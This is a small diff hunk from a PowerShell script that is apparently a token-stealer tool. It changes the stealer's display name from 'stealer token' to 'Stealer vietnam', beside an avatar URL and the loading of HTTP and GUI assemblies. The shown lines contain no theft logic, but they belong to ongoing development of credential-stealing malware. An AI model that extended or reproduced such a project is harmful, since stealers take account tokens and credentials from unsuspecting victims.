@@ -15,7 +15,7 @@ else {
 }
 
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
-$namestealer = "stealer token"
+$namestealer = "Stealer vietnam"
 
 # Load WPF assemblies
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
